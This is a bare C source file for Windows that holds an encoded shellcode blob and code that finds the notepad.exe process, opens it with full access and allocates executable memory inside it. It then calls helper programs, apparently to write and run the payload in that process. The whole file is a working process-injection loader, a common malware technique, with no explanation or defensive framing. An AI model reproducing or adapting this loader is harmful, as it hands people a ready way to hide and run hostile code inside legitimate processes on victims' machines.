#include <windows.h>
#include <stdio.h>
#include <tlhelp32.h>
#include <unistd.h>

unsigned char shellcode[] =
"\x4d\x31\xdb\x54\x5d\xdd\xc7\x66\x81\xe5\x10\xf9\x48\x0f"
"\xae\x45\x00\x41\xb3\x40\x49\xbd\x85\x0e\x3b\xfd\xdb\x1c"
"\xd7\x2f\x48\x8b\x55\x08\x49\xff\xcb\x4e\x31\x6c\xda\x2a"
"\x4d\x85\xdb\x75\xf3\x79\x46\xb8\x19\x2b\xf4\x1b\x2f\x85"
"\x0e\x7a\xac\x9a\x4c\x85\x7e\xd3\x46\x0a\x2f\xbe\x54\x5c"
"\x7d\xe5\x46\xb0\xaf\xc3\x54\x5c\x7d\xa5\x46\x34\x4a\x91"
"\x56\x9a\x1e\x4c\x46\xb0\x8f\x8b\x54\xe6\xef\x29\x32\x5a"
"\x81\xd9\x30\xf7\x6e\x44\xc7\x36\xbc\xda\xdd\x35\xc2\xd7"
"\x46\xb0\xaf\xfb\x97\x95\x13\xc4\x5f\x73\xfc\x0b\x7a\x56"
"\x57\x9d\x05\x39\xf2\x5e\x6e\xd7\x2f\x85\x85\xbb\x75\xdb"
"\x1c\xd7\x67\x00\xce\x4f\x9a\x93\x1d\x07\x6b\x0e\x4e\x1b"
"\x76\x93\x04\x87\x66\x84\xde\xd8\xab\x93\xe3\x1e\x6e\x0e"
"\x3a\xb3\xb0\xea\xd5\x9f\x2e\x53\x46\x0a\x3d\x77\x5d\x16"
"\xe6\x88\x4f\x3a\x3c\xe3\xfc\xa2\xde\xc9\x0d\x77\xd9\xd3"
"\x59\xee\xfe\xf0\xd6\x63\xb9\x50\x5c\xf3\x66\x84\xde\x5d"
"\xbc\x50\x10\x9f\x6b\x0e\x4e\x27\xb4\xda\xcc\x96\xa4\x81"
"\x86\x7a\xa5\x93\x1d\x07\x6e\xdd\x50\x62\xa7\x9a\x44\x96"
"\x76\xc4\x54\x73\x7e\x37\x3c\x96\x7d\x7a\xee\x63\xbc\x82"
"\x46\x9f\xa4\x97\xe7\x70\x02\x24\xe3\x8a\x66\x3b\x79\x48"
"\xcf\x84\x2f\xe5\x2f\x85\x4f\x6d\xb4\x52\xfa\x9f\xae\x69"
"\xae\x3a\xfd\xdb\x55\x5e\xca\xcc\xb2\x39\xfd\xce\xaf\x17"
"\x87\x84\x90\x7a\xa9\x92\x95\x33\x63\x0c\xff\x7a\x47\x97"
"\x6b\xf1\x28\x7a\xdb\x77\x74\x31\x74\xd6\x2e\x85\x0e\x62"
"\xbc\x61\x35\x57\x44\x85\xf1\xee\x97\xd1\x5d\x89\x7f\xd5"
"\x43\x0a\x34\x96\x2d\x17\x67\x7a\xce\x73\x74\x19\x54\x28"
"\xef\xcd\x87\xfa\xbc\x61\xf6\xd8\xf0\x65\xf1\xee\xb5\x52"
"\xdb\xbd\x3f\xc4\x56\x77\x74\x39\x54\x5e\xd6\xc4\xb4\xa2"
"\x58\xaf\x7d\x28\xfa\x00\xce\x4f\xf7\x92\xe3\x19\x5a\x60"
"\xe6\xa8\xfd\xdb\x1c\x9f\xac\x69\x1e\x73\x74\x39\x51\xe6"
"\xe6\xef\x0a\x7a\xa5\x93\x95\x2e\x6e\x3f\x0c\xe2\x35\x84"
"\xe3\x02\xac\x7d\x0e\x45\xa8\x93\x9f\x13\x0f\xdb\x87\xcd"
"\x97\x9b\x5d\x8e\x47\x85\x1e\x3b\xfd\x9a\x44\x9f\xa6\x77"
"\x46\x0a\x34\x9a\xa6\x8f\x8b\xd6\xeb\xc4\x28\x93\x95\x14"
"\x66\x0c\xc9\x76\xcc\x12\x55\x5e\xdf\xcd\x87\xe1\xb5\x52"
"\xe5\x96\x95\x87\xd7\xf3\xa2\x24\xc9\x54\xd7\x85\x73\x13"
"\xa5\x9a\x4b\x8e\x47\x85\x4e\x3b\xfd\x9a\x44\xbd\x2f\xdf"
"\x4f\x81\xf6\xf4\x13\xe7\xd0\x50\x59\x62\xbc\x61\x69\xb9"
"\x62\xe4\xf1\xee\xb4\x24\xd2\x3e\x13\x7a\xf1\xc4\xb5\xda"
"\xdf\x9f\x06\x43\x46\xbe\x0b\xae\xa8\x96\xd0\x62\x56\x51"
"\xfd\x82\x55\x10\xed\x75\xbb\x99\xab\x24\xc9\x9c\xd2";


DWORD FindNotepadPID() {
    DWORD pid = 0;
    HANDLE snapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    if (snapshot == INVALID_HANDLE_VALUE) {
        return 0;
    }

    PROCESSENTRY32 processEntry;
    processEntry.dwSize = sizeof(PROCESSENTRY32);

    if (Process32First(snapshot, &processEntry)) {
        do {
            if (strcmp(processEntry.szExeFile, "notepad.exe") == 0) {
                pid = processEntry.th32ProcessID;
                break;
            }
        } while (Process32Next(snapshot, &processEntry));
    }

    CloseHandle(snapshot);
    return pid;
}

int main() {
    DWORD pid = FindNotepadPID();
    if (pid == 0) {
        printf("Notepad not found!\n");
        return 1;
    }

    HANDLE hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, pid);
    if (hProcess == NULL) {
        printf("Failed to open process! Error: %d\n", GetLastError());
        return 1;
    }

    LPVOID remoteMemory = VirtualAllocEx(hProcess, NULL, sizeof(shellcode),MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
    if (remoteMemory == NULL) {
        printf("Failed to allocate memory! Error: %d\n", GetLastError());
        CloseHandle(hProcess);
        return 1;
    }

    printf("PID: %d\n", pid);
    printf("Allocated memory at address: 0x%p\n", remoteMemory);
    char command[256];

    sleep(2);
    snprintf(command, sizeof(command), "exe2.exe %d %p", pid ,remoteMemory);
    printf("exec: %s\n", command);
    system(command);
    sleep(2);
    snprintf(command, sizeof(command), "exe3.exe %d %p", pid ,remoteMemory);
    printf("exec: %s\n", command);
    system(command);
    getchar();
    
    CloseHandle(hProcess);    
    return 0;
}

